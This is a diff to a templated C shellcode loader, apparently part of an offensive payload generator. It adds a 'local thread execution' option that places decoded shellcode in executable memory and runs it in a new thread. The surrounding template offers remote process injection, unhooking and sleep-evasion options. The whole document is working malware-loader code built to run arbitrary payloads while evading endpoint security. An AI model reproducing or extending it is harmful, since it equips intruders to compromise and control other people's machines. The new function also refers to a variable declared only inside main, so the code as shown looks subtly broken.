@@ -50,8 +50,8 @@ void unhook(const char* internal_name, const char* filepath) {
 }
 {% endif %}
 
+{% if options.remote_inject %}
 void spawn_inject_remote_process() {
-  //TODO self inject!
   STARTUPINFO si = {0};
   PROCESS_INFORMATION pi = {0};
 
@@ -72,6 +72,26 @@ void spawn_inject_remote_process() {
 
   CloseHandle(pi.hProcess);
 }
+{% endif %}
+
+{% if options.local_thread_execution %}
+void local_thread_execution() {
+
+  PVOID localBuff = VirtualAlloc(NULL, {{shellcode_length}}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+  if(localBuff != NULL){
+
+    memcpy(localBuff, decoded_shellcode ,{{shellcode_length}});
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localBuff, NULL, 0, NULL);
+
+    // Keep the program open.
+    getch();
+  }
+  else {
+    exit(-1);
+  }
+}
+{% endif %}
 
 int main() {
   {% if options.sleep_evasion and options.sleep_evasion > 0 %}
@@ -86,6 +106,13 @@ int main() {
   {% endif %}
 
   char* decoded_shellcode = decode();
+
+  {% if options.remote_inject %}
   spawn_inject_remote_process();
+  {% endif %}
+
+  {% if options.local_thread_execution %}
+  local_thread_execution();
+  {% endif %}
   return 0;
 }
